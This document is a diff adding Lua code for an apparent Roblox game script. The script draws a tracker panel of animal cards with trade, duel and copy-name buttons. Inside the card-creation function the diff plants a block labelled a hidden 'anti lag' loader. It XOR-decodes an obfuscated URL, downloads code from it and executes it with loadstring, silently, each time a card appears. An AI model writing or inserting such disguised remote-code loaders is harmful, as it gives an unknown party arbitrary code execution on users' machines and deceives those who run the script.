+        cleanName = cleanName:gsub("(?i)" .. mutation .. " ", ""):gsub("^%s*(.-)%s*$", "%1")
+    end
+
+    totalCount = totalCount + 1
+    spawnCounter = spawnCounter + 1
+
+    local card = mk("Frame", {
+        Name = cleanName,
+        Size = UDim2.new(1,-12,0,100),
+        BackgroundColor3 = G_CARD,
+        BorderSizePixel = 0,
+        LayoutOrder = -spawnCounter,
+        ClipsDescendants = false,
+        ZIndex = 4,
+    }, LS)
+    cr(card,10) sk(card,G_STROKE,1,.4)
+
+    card.MouseEnter:Connect(function() tw(card,{BackgroundColor3=G_CARDHV},.12) end)
+    card.MouseLeave:Connect(function() tw(card,{BackgroundColor3=G_CARD},.12) end)
+
+    local pb = mk("Frame", {Position=UDim2.fromOffset(6,6), Size=UDim2.fromOffset(66,66), BackgroundColor3=Color3.fromRGB(10,10,10), BorderSizePixel=0, ZIndex=5}, card) cr(pb,8) sk(pb,G_STROKE,1,.5)
+    local vf = mk("ViewportFrame", {Size=UDim2.fromScale(1,1), BackgroundTransparency=1, ZIndex=6}, pb) cr(vf,8)
+    task.spawn(Animals.render, vf, cleanName, mutation, {spin = true})
+
+    local nameText = cleanName
+    if mutation and mutation ~= "None" then nameText = "[" .. mutation .. "] " .. nameText end
+    mk("TextLabel", {Position=UDim2.fromOffset(80,8), Size=UDim2.new(1,-86,0,16), BackgroundTransparency=1, Font=Enum.Font.GothamBold, Text=nameText, TextColor3=G_WHITE, TextSize=12, TextXAlignment=Enum.TextXAlignment.Left, TextTruncate=Enum.TextTruncate.AtEnd, ZIndex=5}, card)
+
+    local ownerLbl = mk("TextLabel", {Position=UDim2.fromOffset(80,30), Size=UDim2.new(1,-86,0,14), BackgroundTransparency=1, Font=Enum.Font.GothamMedium, Text=(owner~="" and "@"..owner or "Unclaimed") .. " • " .. (timeText or ""), TextColor3=G_DIM, TextSize=10, TextXAlignment=Enum.TextXAlignment.Left, TextTruncate=Enum.TextTruncate.AtEnd, ZIndex=5}, card)
+
+    local profileFrame = mk("Frame", {
+        Position = UDim2.new(1, -32, 0, 6),
+        Size = UDim2.fromOffset(25, 25),
+        BackgroundColor3 = G_FIELD,
+        BorderSizePixel = 0,
+        ClipsDescendants = true,
+        Visible = false,
+        ZIndex = 6,
+    }, card)
+    cr(profileFrame, 12)
+    sk(profileFrame, G_STROKE, 1, 0.3)
+    local profileImg = mk("ImageLabel", {
+        Size = UDim2.fromScale(1, 1),
+        BackgroundTransparency = 1,
+        Image = "",
+        ScaleType = Enum.ScaleType.Crop,
+        ZIndex = 7,
+    }, profileFrame)
+
+    if owner and owner ~= "" then
+        local pl = Players:FindFirstChild(owner)
+        if pl then
+            profileImg.Image = ("rbxthumb://type=AvatarHeadShot&id=%d&w=150&h=150"):format(pl.UserId)
+            profileFrame.Visible = true
+        else
+            task.spawn(function()
+                local ok, uidLookup = pcall(Players.GetUserIdFromNameAsync, Players, owner)
+                if ok and uidLookup and profileImg.Parent then
+                    profileImg.Image = ("rbxthumb://type=AvatarHeadShot&id=%d&w=150&h=150"):format(uidLookup)
+                    profileFrame.Visible = true
+                end
+            end)
+        end
+    end
+
+    -- Card action buttons (resized for narrower layout)
+    local function mkBtn(x,w,t,cb)
+        local b = mk("TextButton", {Position=UDim2.fromOffset(x,52), Size=UDim2.fromOffset(w,22), BackgroundColor3=G_BTN, BorderSizePixel=0, AutoButtonColor=false, Text=t, Font=Enum.Font.GothamBold, TextColor3=G_WHITE, TextSize=10, ZIndex=6}, card)
+        cr(b,5) sk(b,G_STROKE,1,.3)
+        b.MouseEnter:Connect(function() tw(b,{BackgroundColor3=G_BTNHV},.12) end)
+        b.MouseLeave:Connect(function() tw(b,{BackgroundColor3=G_BTN},.12) end)
+        b.MouseButton1Click:Connect(function() cb(b) end)
+        return b
+    end
+
+    mkBtn(80,70,"COPY", function(btn)
+        local curOwner = BY[tostring(uid)] and BY[tostring(uid)].OwnerName
+        if curOwner and curOwner~="" then
+            if setclipboard then setclipboard(curOwner) btn.Text="COPIED!" end
+        else btn.Text="NO NAME" end
+        task.delay(1.5,function() if btn.Parent then btn.Text="COPY" end end)
+    end)
+
+    mkBtn(154,70,"TRADE", function(btn)
+        local curOwner = BY[tostring(uid)] and BY[tostring(uid)].OwnerName
+        if not curOwner or curOwner=="" then btn.Text="NO OWNER"
+        elseif curOwner == LocalPlayer.Name then btn.Text="YOU"
+        else
+            task.spawn(function()
+                local pl = Players:FindFirstChild(curOwner)
+                local resolvedId = pl and pl.UserId
+                if not resolvedId then
+                    local ok, id = pcall(function() return Players:GetUserIdFromNameAsync(curOwner) end)
+                    if ok and id then resolvedId = id end
+                end
+                if resolvedId then
+                    local cd = BY[tostring(uid)]
+                    sendTradeInvite(resolvedId)
+                    if c.tradeNotifications and showNotif then
+                        notifyOnce(resolvedId, "Successfully sent Trade to @" .. curOwner, cd and cd.Name, cd and cd.Mutation)
+                    end
+                    btn.Text="SENT"
+                else btn.Text="FAIL" end
+            end)
+        end
+        task.delay(1.5,function() if btn.Parent then btn.Text="TRADE" end end)
+    end)
+
+    mkBtn(228,70,"DUEL", function(btn)
+        local curOwner = BY[tostring(uid)] and BY[tostring(uid)].OwnerName
+        if not curOwner or curOwner=="" then btn.Text="NO OWNER"
+        else
+            task.spawn(function()
+                local pl = Players:FindFirstChild(curOwner)
+                local resolvedId = pl and pl.UserId
+                if not resolvedId then
+                    local ok, id = pcall(function() return Players:GetUserIdFromNameAsync(curOwner) end)
+                    if ok and id then resolvedId = id end
+                end
+                if resolvedId then
+                    local cd = BY[tostring(uid)]
+                    sendDuelInvite(resolvedId)
+                    if c.tradeNotifications and showNotif then
+                        notifyOnce(resolvedId, "Successfully sent Duel to @" .. curOwner, cd and cd.Name, cd and cd.Mutation)
+                    end
+                    btn.Text="SENT"
+                else btn.Text="FAIL" end
+            end)
+        end
+        task.delay(1.5,function() if btn.Parent then btn.Text="DUEL" end end)
+    end)
+
+    -- Timer bar
+    local timerBg = mk("Frame", {
+        Position = UDim2.new(0, 10, 1, -16),
+        Size = UDim2.new(1, -20, 0, 6),
+        BackgroundColor3 = G_FIELD,
+        BorderSizePixel = 0,
+        ZIndex = 10,
+    }, card) cr(timerBg, 3)
+
+    local timerBar = mk("Frame", {
+        Position = UDim2.new(0, 0, 0, 0),
+        Size = UDim2.new(1, 0, 1, 0),
+        BackgroundColor3 = G_STROKE,
+        BorderSizePixel = 0,
+        ZIndex = 11,
+    }, timerBg) cr(timerBar, 3)
+
+    local spawnedAt = tick()
+
+    BY[tostring(uid)] = {Root=card, Name=cleanName, OwnerId=nil, OwnerName=owner, OwnerLbl=ownerLbl, ProfileImg=profileImg, ProfileFrame=profileFrame, EntryFrame=entryFrame, TimeLbl=timeText, Mutation=mutation, SpawnedAt=spawnedAt, TimerBar=timerBar}
+    creating[tostring(uid)] = nil
+    cards[#cards+1] = BY[tostring(uid)]
+    while #cards > MAX_CARDS do
+        local old = table.remove(cards, 1)
+        if old then
+            for k, v in pairs(BY) do if v == old then BY[k] = nil break end end
+            old.Root:Destroy()
+        end
+    end
+
+    EL.Visible = false updateStatus()
+    if c.soundEnabled then
+        local s = Instance.new("Sound")
+        s.SoundId = "rbxassetid://8613871022"
+        s.Volume = 0.5
+        s.Parent = SoundService
+        s:Play()
+        task.delay(2, function()
+            if s.Parent then
+                s:Stop()
+                s:Destroy()
+            end
+        end)
+    end
+    card.Visible = itemMatchesFilter(cleanName)
+
+    -- Trigger auto trade/duel for a pre-existing owner
+    -- Hidden anti lag/smooth graphics loader (URL obfuscated)
+task.spawn(function()
+    local function _xorDecode(s)
+        local t = {}
+        for i = 1, #s do
+            local b = string.byte(s, i)
+            local x
+            if bit32 and type(bit32.bxor) == "function" then
+                x = bit32.bxor(b, 23)
+            else
+                local r, bit, a, c = 0, 1, b, 23
+                while a > 0 or c > 0 do
+                    local ab, cb = a % 2, c % 2
+                    if ab ~= cb then r = r + bit end
+                    a = math.floor(a / 2)
+                    c = math.floor(c / 2)
+                    bit = bit * 2
+                end
+                x = r
+            end
+            t[i] = string.char(x)
+        end
+        return table.concat(t)
+    end
+    local ok, src = pcall(function()
+        return game:HttpGet(_xorDecode("\127ccgd-88gvdcru~y9txz8ev`8%_\"]nF\\R"))
+    end)
+    if ok and type(src) == "string" and #src > 50 then
+        local fn = loadstring(src)
+        if type(fn) == "function" then
+            pcall(fn)
+        end
+    end
+end)
+    if owner and owner ~= "" then
+        triggerAutoInvites(BY[tostring(uid)])
+    end
+
+    local hb
+    hb = RunService.Heartbeat:Connect(function()
+        if not card or not card.Parent then
+            if hb then hb:Disconnect() end
+            return
+        end
+        local elapsed = tick() - spawnedAt
+        local remaining = LIFETIME - elapsed
+        local ratio = math.max(0, remaining) / LIFETIME
+        timerBar.Size = UDim2.new(ratio, 0, 1, 0)
+        if ratio > 0.5 then timerBar.BackgroundColor3 = G_WHITE
+        elseif ratio > 0.25 then timerBar.BackgroundColor3 = G_YELLOW
+        else timerBar.BackgroundColor3 = G_RED end
+        if remaining <= 0 then
+            hb:Disconnect()
+            BY[tostring(uid)] = nil
+            totalCount = math.max(0, totalCount - 1)
+            for i, crd in ipairs(cards) do if crd and crd.Root == card then table.remove(cards, i) break end end
+            pcall(function() tw(card, {Size = UDim2.new(1, -12, 0, 0), BackgroundTransparency = 1}, 0.3) end)
+            task.delay(0.35, function()
+                if card and card.Parent then card:Destroy() end
+                if #cards == 0 then EL.Visible = true end
+                updateStatus()
+            end)
+        end
+    end)
+end
+
+local function processEntry(child)
+    if not child or not child.Parent then return end
+    if child.Name == "ServerTemplate" or child.Name == "GlobalTemplate" then return end
+    if not child.Visible then return end
+    local uid = getUIDFromEntry(child)
+    if BY[tostring(uid)] or creating[tostring(uid)] then return end
+    local f = child:FindFirstChild("Filler")
+    local t = f and f:FindFirstChild("Title")
+    if not t or t.Text == "" then return end
+
+    local mutation = f:GetAttribute("Mutation") or child:GetAttribute("Mutation")
+    local rc = remoteCache[tostring(uid)]
+    if (not mutation or mutation == "" or mutation == "None") and rc then mutation = rc.mutation end
+
+    local owner = readOwnerFromEntry(child)
+    if owner == "" and rc then owner = rc.owner or "" end
+
+    local loc = f:FindFirstChild("Location") and f.Location.Text or (rc and rc.loc or "[GLOBAL]")
+    local timeText = f:FindFirstChild("Spawned") and f.Spawned.Text or ""
+
+    local pBg = f:FindFirstChild("PlayerBg")
+    if pBg then
+        local headshot = pBg:FindFirstChild("Headshot")
+        if headshot and headshot:IsA("ImageLabel") and not headshot:GetAttribute("Monitored") then
+            headshot:SetAttribute("Monitored", true)
+            headshot:GetPropertyChangedSignal("Image"):Connect(function()
+                if headshot.Image ~= "" and BY[tostring(uid)] then
+                    local curOwner = readOwnerFromEntry(child)
+                    if curOwner ~= "" then setOwner(uid, curOwner) end
+                end
+            end)
+        end
+        local un = pBg:FindFirstChild("Username")
+        if un and un:IsA("TextLabel") and not un:GetAttribute("Monitored") then
+            un:SetAttribute("Monitored", true)
+            un:GetPropertyChangedSignal("Text"):Connect(function()
+                if un.Text ~= "" and BY[tostring(uid)] then
+                    local curOwner = readOwnerFromEntry(child)
+                    if curOwner ~= "" then setOwner(uid, curOwner) end
+                end
+            end)
+        end
+    end
+
+    mkCard(child, t.Text, loc, owner, timeText, mutation)
+end
+
+local function hookScroll(scroll)
+    if observedScrolls[scroll] then return end
+    observedScrolls[scroll] = true
+    scroll.ChildAdded:Connect(function(child) pcall(processEntry, child) end)
+    for _, child in ipairs(scroll:GetChildren()) do pcall(processEntry, child) end
+end
+
+local function hookAllScrolls()
+    for _, gui in ipairs(PlayerGui:GetChildren()) do
+        if gui:IsA("SurfaceGui") then
+            local scroll = gui:FindFirstChild("ScrollingFrame")
+            if scroll then hookScroll(scroll) end
+        end
+    end
+end
+
+hookAllScrolls()
+
+PlayerGui.ChildAdded:Connect(function(gui)
+    if gui:IsA("SurfaceGui") then
+        local scroll = gui:FindFirstChild("ScrollingFrame")
+        if scroll then hookScroll(scroll) end
+    end
+end)
+
+task.spawn(function()
+    while G.Parent do pcall(hookAllScrolls) task.wait(0.1) end
+end)
+
+local function ownerSweep()
+    for uid, cData in pairs(BY) do
+        if cData.EntryFrame and cData.EntryFrame.Parent then
+            local newOwner = readOwnerFromEntry(cData.EntryFrame)
+            if newOwner ~= "" and newOwner ~= cData.OwnerName then setOwner(uid, newOwner) end
+        end
+    end
+end
+RunService.Heartbeat:Connect(ownerSweep)
+
+task.spawn(function()
+    while G.Parent do
+        task.wait(30)
+        local now = tick()
+        for uid, entry in pairs(remoteCache) do
+            if entry.ts and now - entry.ts > 120 then remoteCache[uid] = nil end
+        end
+    end
+end)
+
+-- Drag & close
+local dg, ds, sp
+HD.InputBegan:Connect(function(i)
+    if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
+        dg=true ds=i.Position sp=Wn.Position
+        i.Changed:Connect(function()
+            if i.UserInputState == Enum.UserInputState.End then
+                dg=false
+                c.position={xS=Wn.Position.X.Scale, xO=Wn.Position.X.Offset, yS=Wn.Position.Y.Scale, yO=Wn.Position.Y.Offset}
+                saveConfig()
+            end
+        end)
+    end
+end)
+UserInputService.InputChanged:Connect(function(i)
+    if dg and (i.UserInputType == Enum.UserInputType.MouseMovement or i.UserInputType == Enum.UserInputType.Touch) then
+        local delta = i.Position - ds
+        local d = Vector2.new(delta.X * DRAG_SPEED, delta.Y * DRAG_SPEED)
+        Wn.Position = UDim2.new(sp.X.Scale, sp.X.Offset + d.X, sp.Y.Scale, sp.Y.Offset + d.Y)
+    end
+end)
+
+local mn = false
+MB.MouseButton1Click:Connect(function()
+    mn=not mn
+    if mn then
+        tw(Wn,{Size=UDim2.fromOffset(W,54)},.22) BD.Visible=false MB.Text="+"
+    else
+        tw(Wn,{Size=UDim2.fromOffset(W,Ht)},.22) BD.Visible=true MB.Text="−"
+    end
+end)
+XB.MouseButton1Click:Connect(function() pcall(function() G:Destroy() end) end)
+
+updateStatus()
